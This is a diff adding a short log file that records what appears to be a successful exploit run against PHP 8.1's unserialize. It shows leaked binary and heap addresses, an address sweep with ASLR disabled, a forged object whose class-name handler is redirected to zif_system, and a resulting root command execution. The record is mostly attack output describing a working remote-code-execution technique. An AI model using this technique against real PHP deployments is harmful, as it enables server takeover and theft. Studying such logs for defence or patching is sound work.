@@ -1,0 +1,20 @@
+[*] target binary: /usr/bin/php8.1 (PHP 8.1.2)
+[+] binary base 0x555555554000  zif_system 0x55555576e780 (+0x21a780)
+[+] ZendMM chunk candidates: 0x7ffff4c00000
+[*] chain zero4: running under /usr/bin/setarch -R (ASLR off, no gdb), address sweep
+    [zero4] try #1 chunk=0x7ffff4c00000 base=0x7ffff4c90000 -> rc=0
+    [zero4] try #2 chunk=0x7ffff4c00000 base=0x7ffff4c91000 -> rc=0
+    [zero4] try #3 chunk=0x7ffff4c00000 base=0x7ffff4c92000 -> rc=0
+    [zero4] try #4 chunk=0x7ffff4c00000 base=0x7ffff4c93000 -> rc=0
+    [zero4] try #5 chunk=0x7ffff4c00000 base=0x7ffff4c94000 -> rc=0
+    [zero4] try #6 chunk=0x7ffff4c00000 base=0x7ffff4c95000 -> rc=0
+    [zero4] try #7 chunk=0x7ffff4c00000 base=0x7ffff4c96000 -> rc=0
+    [zero4] try #8 chunk=0x7ffff4c00000 base=0x7ffff4c97000 -> rc=0
+    [zero4] try #9 chunk=0x7ffff4c00000 base=0x7ffff4c98000 -> rc=0
+    [zero4] try #10 chunk=0x7ffff4c00000 base=0x7ffff4c99000 -> HIT
+[+] === zero4: RCE === freed-block base 0x7ffff4c99000
+[+] RECEIPT (command output): uid=0(root) gid=0(root) groups=0(root)
+Rasputin
+    forged: OBJ=0x7ffff4c99038 HT=0x7ffff4c99270 zif_system=0x55555576e780 patlen=2032
+    TRIGGERING var_dump($r1) -> handlers->get_class_name(obj)=zif_system(fake_execute_data)
+[+] scripts kept in /tmp/pwn_unserialize_kx61mxl1
